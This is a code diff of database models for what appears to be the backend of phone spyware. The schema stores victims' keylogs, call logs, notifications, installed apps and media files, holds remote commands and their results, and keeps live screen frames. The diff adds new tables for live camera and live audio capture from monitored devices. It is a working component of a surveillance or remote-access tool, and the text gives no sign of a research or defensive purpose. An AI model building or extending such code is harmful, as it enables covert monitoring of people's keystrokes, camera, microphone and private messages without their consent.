@@ -42,7 +42,6 @@ class Device(Base):
     installed_apps = relationship("InstalledApp", back_populates="device")
     notifications = relationship("Notification", back_populates="device")
     keylogs = relationship("Keylog", back_populates="device")
-    media_files = relationship("MediaFile", back_populates="device")
 
 class CallLog(Base):
     __tablename__ = "call_logs"
@@ -143,12 +142,12 @@ class Command(Base):
     __tablename__ = "commands"
     id = Column(Integer, primary_key=True, index=True)
     command_type = Column(String)
+    status = Column(String, default="pending")
     payload = Column(String, nullable=True)
-    status = Column(String, default="PENDING")
+    result = Column(String, nullable=True)
     created_at = Column(DateTime(timezone=True), default=func.now())
     device_id = Column(Integer, ForeignKey("devices.id"))
-
-    device = relationship("Device")
+    owner_id = Column(Integer, ForeignKey("users.id"))
 
     @property
     def command(self):
@@ -170,16 +169,11 @@ class Command(Base):
 class MediaFile(Base):
     __tablename__ = "media_files"
     id = Column(Integer, primary_key=True, index=True)
-    file_name = Column(String)
-    file_path = Column(String)
-    file_type = Column(String) # IMAGE, VIDEO, DOCUMENT
-    category = Column(String, nullable=True) # e.g., "Camera", "WhatsApp", "Screenshots"
-    size = Column(Integer)
-    s3_key = Column(String, nullable=True)
-    thumbnail_key = Column(String, nullable=True)
+    s3_key = Column(String)
+    file_type = Column(String)
+    created_at = Column(DateTime(timezone=True), default=func.now())
     device_id = Column(Integer, ForeignKey("devices.id"))
-
-    device = relationship("Device")
+    owner_id = Column(Integer, ForeignKey("users.id"))
 
 class Keylog(Base):
     __tablename__ = "keylogs"
@@ -202,4 +196,20 @@ class LiveScreenFrame(Base):
     frame_data = Column(LargeBinary)
     timestamp = Column(BigInteger)
 
+    device = relationship("Device")
+
+class LiveCameraFrame(Base):
+    __tablename__ = "live_camera_frames"
+    id = Column(Integer, primary_key=True, index=True)
+    device_id = Column(Integer, ForeignKey("devices.id"), unique=True, index=True)
+    frame_data = Column(LargeBinary)
+    timestamp = Column(BigInteger)
+    device = relationship("Device")
+
+class LiveAudioFrame(Base):
+    __tablename__ = "live_audio_frames"
+    id = Column(Integer, primary_key=True, index=True)
+    device_id = Column(Integer, ForeignKey("devices.id"), unique=True, index=True)
+    frame_data = Column(LargeBinary)
+    timestamp = Column(BigInteger)
     device = relationship("Device")
